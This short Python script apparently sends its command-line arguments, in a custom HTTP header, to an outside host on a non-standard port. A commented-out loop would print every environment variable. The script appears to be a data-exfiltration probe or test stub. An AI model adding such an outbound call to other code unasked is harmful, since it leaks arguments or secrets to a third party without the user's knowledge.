import requests
import os
import sys

#for var in os.environ:
#  print(var, os.environ[var])

r=requests.get("http://vcapp.stephenshanko.com:5482", headers={"X-Security-Header":f"{sys.argv}"})
